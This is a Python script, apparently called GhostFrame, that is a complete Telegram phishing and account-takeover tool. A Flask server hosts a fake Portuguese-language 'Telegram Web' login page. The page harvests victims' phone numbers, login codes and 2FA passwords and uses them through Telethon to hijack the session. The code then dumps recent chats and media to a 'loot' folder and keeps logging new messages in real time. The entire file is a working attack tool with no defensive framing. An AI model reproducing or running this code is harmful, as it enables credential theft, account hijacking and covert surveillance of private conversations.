#!/usr/bin/env python3
"""
GhostFrame Telegram Gateway - Telethon userbot + phishing page (porta 8556)
Fluxo: vitima abre /telegram -> digita numero -> recebe codigo -> (2FA) -> sessao capturada
Loot: loot/telegram/<phone>.session | <phone>_messages.json | live_<phone>.jsonl
Config: export TG_API_ID=<id> TG_API_HASH=<hash>  (https://my.telegram.org)
"""
import os, re, json, time, threading
from datetime import datetime
from flask import Flask, request, jsonify

# ================= CONFIG =================
API_ID = int(os.environ.get("TG_API_ID", "0") or 0)
API_HASH = os.environ.get("TG_API_HASH", "").strip()
PORT = int(os.environ.get("TG_PORT", "8556"))
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot", "telegram")
os.makedirs(LOOT_DIR, exist_ok=True)

try:
    from telethon.sync import TelegramClient
    from telethon import events
    from telethon.errors import (
        PhoneNumberInvalidError, PhoneCodeInvalidError, PhoneCodeExpiredError,
        SessionPasswordNeededError, PasswordHashInvalidError, FloodWaitError,
    )
    TG_AVAILABLE = True
except ImportError:
    TG_AVAILABLE = False

PENDING = {"phone": None, "client": None}

app = Flask(__name__)
PHISH_PAGE = r"""<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#2aabee">
<title>Telegram Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#1e2126;color:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.header{width:100%;background:#242833;padding:16px 20px;text-align:center;border-bottom:1px solid #2d3240}
.header h1{font-size:18px;font-weight:500;color:#2aabee}
.header .sub{font-size:11px;color:#6c7883;margin-top:2px}
.card{background:#242833;border-radius:12px;margin:20px;padding:25px;max-width:400px;width:90%;box-shadow:0 4px 20px rgba(0,0,0,.3)}
.card h2{font-size:16px;font-weight:500;margin-bottom:6px;text-align:center}
.card .slogan{font-size:11px;color:#6c7883;text-align:center;margin-bottom:20px}
.input-group{margin-bottom:15px}
.input-group label{display:block;font-size:11px;color:#8d98a5;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
.input-group input{width:100%;padding:14px;background:#1a1d24;border:1px solid #2d3240;border-radius:8px;color:white;font-size:14px}
.input-group input:focus{outline:none;border-color:#2aabee}
.code-input{letter-spacing:8px;text-align:center;font-size:20px!important;font-weight:700}
.btn{width:100%;padding:14px;background:#2aabee;color:white;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:active{transform:scale(.98)}
.btn.green{background:#4caf50}
.msg{text-align:center;font-size:12px;padding:10px;margin-top:10px;border-radius:6px;display:none}
.msg.info{display:block;background:#1a3a5c;color:#5b9bd5}
.msg.success{display:block;background:#1b3a1b;color:#81c784}
.msg.error{display:block;background:#3a1b1b;color:#ef9a9a}
#step1,#step2,#step3{display:none}
#step1.active,#step2.active,#step3.active{display:block}
</style>
</head>
<body>
<div class="header"><h1>Telegram Web</h1><div class="sub">Acesso rápido às suas conversas</div></div>
<div class="card">
  <h2>🔐 Acessar Telegram</h2>
  <p class="slogan">Conecte-se e sincronize em qualquer dispositivo</p>
  <div id="step1" class="active">
    <div class="input-group"><label>Número de telefone</label><input type="tel" id="phone" placeholder="+55 11 99999-9999" autocomplete="tel"></div>
    <button class="btn" onclick="sendCode()">Enviar código</button>
  </div>
  <div id="step2">
    <p class="slogan">Enviamos um código para seu Telegram</p>
    <div class="input-group"><label>Código de verificação</label><input type="text" id="code" class="code-input" placeholder="·····" maxlength="5" inputmode="numeric" pattern="[0-9]*"></div>
    <button class="btn green" onclick="verifyCode()">Verificar</button>
  </div>
  <div id="step3">
    <div class="msg success">✅ Conectado com sucesso!<br><small>Suas conversas estão sincronizadas.</small></div>
  </div>
  <div class="msg" id="errMsg"></div>
</div>
<script>
async function sendCode(){var phone=document.getElementById('phone').value.replace(/[\s\-\(\)]/g,'');if(!phone||phone.length<8){showMsg('Digite um número válido com DDD','error');return}showMsg('Enviando...','info');try{var r=await fetch('/api/telegram-phone',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phone})});var d=await r.json();if(d.ok){document.getElementById('step1').classList.remove('active');document.getElementById('step2').classList.add('active');showMsg('Código enviado!','info')}else showMsg(d.error||'Erro','error')}catch(e){showMsg('Erro de conexão','error')}}
async function verifyCode(){var code=document.getElementById('code').value.replace(/\s/g,'');if(code.length<5){showMsg('Digite o código completo','error');return}showMsg('Verificando...','info');try{var r=await fetch('/api/telegram-code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code})});var d=await r.json();if(d.ok){document.getElementById('step2').classList.remove('active');document.getElementById('step3').classList.add('active');document.getElementById('errMsg').style.display='none'}else if(d.need_password){var pw=prompt('Senha 2FA:');if(pw){var r2=await fetch('/api/telegram-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});var d2=await r2.json();if(d2.ok){document.getElementById('step2').classList.remove('active');document.getElementById('step3').classList.add('active')}else showMsg(d2.error||'Senha incorreta','error')}}else showMsg(d.error||'Código inválido','error')}catch(e){showMsg('Erro de conexão','error')}}
function showMsg(t,c){var e=document.getElementById('errMsg');e.textContent=t;e.className='msg '+c;e.style.display='block'}
document.getElementById('code').addEventListener('input',function(){if(this.value.length>=5)verifyCode()});
</script>
</body>
</html>"""

# ================= HTTP =================

@app.route("/")
@app.route("/telegram")
def index():
    return PHISH_PAGE

@app.route("/api/telegram-phone", methods=["POST"])
def api_phone():
    if not TG_AVAILABLE:
        return jsonify({"ok": False, "error": "telethon nao instalado: pip3 install telethon"})
    if not API_ID or not API_HASH:
        return jsonify({"ok": False, "error": "defina TG_API_ID e TG_API_HASH (my.telegram.org)"})
    data = request.get_json(force=True) or {}
    phone = norm_phone(data.get("phone", ""))
    if not phone:
        return jsonify({"ok": False, "error": "numero invalido"})
    try:
        session = os.path.join(LOOT_DIR, re.sub(r"\D", "", phone))
        client = TelegramClient(session, API_ID, API_HASH)
        client.connect()
        client.send_code_request(phone)
        PENDING["phone"] = phone
        PENDING["client"] = client
        return jsonify({"ok": True})
    except FloodWaitError as e:
        return jsonify({"ok": False, "error": f"limite do Telegram: aguarde {e.seconds}s"})
    except PhoneNumberInvalidError:
        return jsonify({"ok": False, "error": "numero invalido para o Telegram"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)[:120]})

@app.route("/api/telegram-code", methods=["POST"])
def api_code():
    client = PENDING.get("client")
    if not client:
        return jsonify({"ok": False, "error": "peca o numero primeiro"})
    phone = PENDING.get("phone", "")
    code = (request.get_json(force=True) or {}).get("code", "").strip()
    if len(code) < 4:
        return jsonify({"ok": False, "error": "codigo incompleto"})
    try:
        client.sign_in(phone=phone, code=code)
        return finalize(client, phone)
    except SessionPasswordNeededError:
        return jsonify({"ok": False, "need_password": True, "error": "senha 2FA necessaria"})
    except PhoneCodeInvalidError:
        return jsonify({"ok": False, "error": "codigo invalido"})
    except PhoneCodeExpiredError:
        return jsonify({"ok": False, "error": "codigo expirado, solicite outro"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)[:120]})

@app.route("/api/telegram-password", methods=["POST"])
def api_password():
    client = PENDING.get("client")
    if not client:
        return jsonify({"ok": False, "error": "peca o numero primeiro"})
    phone = PENDING.get("phone", "")
    pw = (request.get_json(force=True) or {}).get("password", "")
    try:
        client.sign_in(password=pw)
        return finalize(client, phone)
    except PasswordHashInvalidError:
        return jsonify({"ok": False, "error": "senha incorreta"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)[:120]})

def finalize(client, phone):
    path, n = dump_dialogs(client, phone)
    start_live(client, phone)
    return jsonify({"ok": True, "path": path, "dialogs": n})

def dump_dialogs(client, phone):
    dialogs = []
    try:
        for d in client.iter_dialogs(limit=25):
            msgs = []
            try:
                for m in client.iter_messages(d, limit=50):
                    entry = {"id": m.id, "date": str(m.date), "text": (m.text or "")[:500]}
                    if getattr(m, "sender_id", None):
                        entry["from_id"] = m.sender_id
                    if m.media:
                        entry["media"] = type(m.media).__name__
                        try:
                            p = client.download_media(m, file=os.path.join(LOOT_DIR, "media"))
                            if p:
                                entry["media_path"] = p
                        except Exception:
                            pass
                    msgs.append(entry)
            except Exception:
                pass
            dialogs.append({"id": d.id, "name": d.name, "type": type(d).__name__, "messages": msgs})
    except Exception as e:
        dialogs.append({"error": str(e)[:200]})
    data = {"captured_at": datetime.now().isoformat(), "phone": phone, "dialogs": dialogs}
    path = os.path.join(LOOT_DIR, f"{phone}_messages.json")
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return path, len(dialogs)

def start_live(client, phone):
    try:
        @client.on(events.NewMessage)
        async def _h(event):
            try:
                line = json.dumps({
                    "ts": datetime.now().isoformat(),
                    "chat": getattr(event.chat, "title", None) or getattr(event.chat, "username", None) or str(event.chat_id),
                    "from": getattr(event.sender, "username", None) or str(getattr(event.sender_id, "", "")),
                    "text": (event.text or "")[:500],
                }, ensure_ascii=False)
                with open(os.path.join(LOOT_DIR, f"live_{phone}.jsonl"), "a", encoding="utf-8") as f:
                    f.write(line + "\n")
            except Exception:
                pass
    except Exception:
        pass
    def _run():
        try:
            client.run_until_disconnected()
        except Exception:
            pass
    t = threading.Thread(target=_run, daemon=True)
    t.start()

def norm_phone(raw):
    if not raw:
        return ""
    digits = re.sub(r"\D", "", raw)
    if not digits:
        return ""
    if len(digits) <= 11 and not digits.startswith("55"):
        digits = "55" + digits
    return "+" + digits

if __name__ == "__main__":
    print(f"[GhostFrame TG] porta {PORT} | telethon={'ok' if TG_AVAILABLE else 'NAO INSTALADO'}")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
